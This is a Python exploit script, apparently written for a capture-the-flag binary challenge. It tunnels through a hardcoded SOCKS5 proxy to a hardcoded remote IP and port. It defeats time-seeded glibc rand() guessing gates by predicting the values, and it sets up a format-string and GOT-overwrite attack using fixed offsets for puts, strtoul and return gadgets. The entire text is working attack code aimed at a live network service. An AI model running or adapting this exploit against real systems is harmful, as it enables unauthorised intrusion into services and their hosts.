import socket, struct, time, sys, re
sys.path.insert(0, '.')
from rand_glibc import GlibcRand

PROXY = ('192.252.214.17', 4145)
TARGET = ('103.163.47.230', 34396)

OFF_RET_MAIN = 0x14da
OFF_ECHO = 0x12d8
OFF_GUESS = 0x1369
OFF_RET = 0x101a
OFF_PUTS_GOT = 0x3f68
OFF_STRTOUL_GOT = 0x3fc0


def p64(x):
    return struct.pack('<Q', x)


class Conn:
    def __init__(self):
        s = socket.create_connection(PROXY, timeout=12)
        s.settimeout(12)
        s.sendall(b'\x05\x01\x00')
        if s.recv(2) != b'\x05\x00':
            raise RuntimeError('socks')
        s.sendall(b'\x05\x01\x00\x01' + socket.inet_aton(TARGET[0]) + struct.pack('>H', TARGET[1]))
        r = s.recv(10)
        if len(r) < 2 or r[1] != 0:
            raise RuntimeError('connect')
        self.t0 = time.time()
        self.s = s
        self.buf = b''
        self.s.settimeout(6)

    def frac(self):
        return self.t0 % 1

    def read_until(self, marker, timeout=6):
        end = time.time() + timeout
        while marker not in self.buf and time.time() < end:
            self.s.settimeout(max(0.1, end - time.time()))
            try:
                d = self.s.recv(4096)
            except socket.timeout:
                break
            if not d:
                break
            self.buf += d
        if marker in self.buf:
            i = self.buf.index(marker) + len(marker)
            out, self.buf = self.buf[:i], self.buf[i:]
            return out, True
        out, self.buf = self.buf, b''
        return out, False

    def pull(self, t=0.5):
        self.s.settimeout(t)
        try:
            while True:
                d = self.s.recv(4096)
                if not d:
                    break
                self.buf += d
        except socket.timeout:
            pass

    def send(self, d):
        self.s.sendall(d)

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


ONE_WAY = 0.30


def gate1_ok(c):
    est = c.t0 - ONE_WAY
    return 0.12 <= (est % 1) <= 0.82


def gate1_send(c):
    seed = int(c.t0 - ONE_WAY)
    c.send(str(GlibcRand(seed).next()).encode() + b'\n')


def gate_send_now(c, lead=0.05, maxwait=1.2):
    """在秒初发送，使服务端处理时仍在同一秒"""
    t = time.time()
    while (t % 1) > 0.45:
        time.sleep(0.01)
        t = time.time()
        if t - time.time() > maxwait:
            break
    c.send(str(GlibcRand(int(t)).next()).encode() + b'\n')


def fmt_addr(spec, target):
    b = spec.encode() + b'\x00'
    b += b'\x00' * (16 - len(b))
    return b + p64(target)
